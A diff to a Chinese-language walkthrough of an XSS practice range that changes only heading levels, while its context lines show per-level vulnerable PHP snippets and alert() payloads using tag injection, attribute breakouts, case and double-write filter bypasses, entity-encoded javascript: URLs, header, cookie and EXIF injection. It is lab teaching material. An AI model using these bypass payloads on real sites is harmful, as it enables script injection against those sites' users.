@@ -24,7 +24,7 @@
 
 ---
 
-# level 1
+## level 1
 
 没什么过滤,直接使用 `<script>alert(123)</script>` 即可
 
@@ -32,7 +32,7 @@ payload: `http://<靶机IP>/level1.php?keyword=test<script>alert(123)</script>`
 
 ---
 
-# level 2
+## level 2
 
 ![images](../../../../../assets/img/Security/RedTeam/Web安全/靶场/XSS/1.png)
 
@@ -42,7 +42,7 @@ payload: `test"><script>alert(123)</script>`
 
 ---
 
-# level 3
+## level 3
 
 使用 `'` 可以闭合
 
@@ -55,7 +55,7 @@ payload: `test'onfocus='alert(1)' autofocus '`
 
 ---
 
-# level 4
+## level 4
 
 ```php
 $str = $_GET["keyword"];
@@ -75,7 +75,7 @@ payload: `test"onfocus=alert(1) autofocus "`
 
 ---
 
-# level 5
+## level 5
 
 ```php
 $str = strtolower($_GET["keyword"]);
@@ -91,7 +91,7 @@ payload: `"><a href=javascript:alert(19)>M`
 
 ---
 
-# level 6
+## level 6
 
 ```php
 $str = $_GET["keyword"];
@@ -110,7 +110,7 @@ payload: `"><ScRiPt>alert(123)</ScRiPt>`
 
 ---
 
-# level 7
+## level 7
 
 ```php
 $str =strtolower( $_GET["keyword"]);
@@ -129,7 +129,7 @@ payload: `"><scrscriptipt>alert("1")</scrscriptipt>`
 
 ---
 
-# level 8
+## level 8
 
 ```php
 $str = strtolower($_GET["keyword"]);
@@ -156,7 +156,7 @@ payload: `javasc&#114;ipt:alert(1)`
 
 ---
 
-# level 9
+## level 9
 
 ```php
 $str = strtolower($_GET["keyword"]);
@@ -184,7 +184,7 @@ else
 
 ---
 
-# level 10
+## level 10
 
 ```php
 $str = $_GET["keyword"];
@@ -208,7 +208,7 @@ payload: `test"onfocus=alert(1) autofocus type="text"`
 
 ---
 
-# level 11
+## level 11
 
 ```php
 $str = $_GET["keyword"];
@@ -234,7 +234,7 @@ payload: `referer:test"onfocus=alert(1) autofocus type="text"`
 
 ---
 
-# level 12
+## level 12
 
 ```php
 $str = $_GET["keyword"];
@@ -260,7 +260,7 @@ payload: `HTTP_USER_AGENT:test"onfocus=alert(1) autofocus type="text"`
 
 ---
 
-# level 13
+## level 13
 
 ```php
 setcookie("user", "call me maybe?", time()+3600);
@@ -288,7 +288,7 @@ payload: `user=test"onfocus=alert(1) autofocus type="text"`
 
 ---
 
-# level 14
+## level 14
 
 这一关的大体思路是在网页中嵌入了 http://www.exifviewer.org/ 这个网站,而这个第三方网站的作用是用于查看图片的 EXIF 信息,所以思路就是通过修改图片的 exif 信息,造成解析图片 exif 造成 XSS
 
@@ -302,7 +302,7 @@ payload: `exiftool(-k).exe -artist="<details open OntogGle="alert(1)">" 1.jpg`
 
 ---
 
-# level 15
+## level 15
 
 这关使用 angularjs 的 ng-include
 
@@ -322,7 +322,7 @@ payload: `?src='level1.php?name=test<img src=1 onerror=alert(1)>'`
 
 ---
 
-# level 16
+## level 16
 
 ```php
 <?php
@@ -342,7 +342,7 @@ payload: `%3Cimg%0dsrc=1%0donerror=alert(2)%3E`
 
 ---
 
-# level 17
+## level 17
 
 ```php
 ini_set("display_errors", 0);
@@ -359,7 +359,7 @@ payload: `arg01=a&arg02=%20onmousedown=alert(1)`
 
 ---
 
-# level 18
+## level 18
 
 ```php
 <?php
@@ -382,6 +382,6 @@ arg01=a&arg02=b onmouseover=alert`1`
 
 ---
 
-# level 19~20
+## level 19~20
 
 以下2关都属于 Flash XSS,对于这个不了解,略
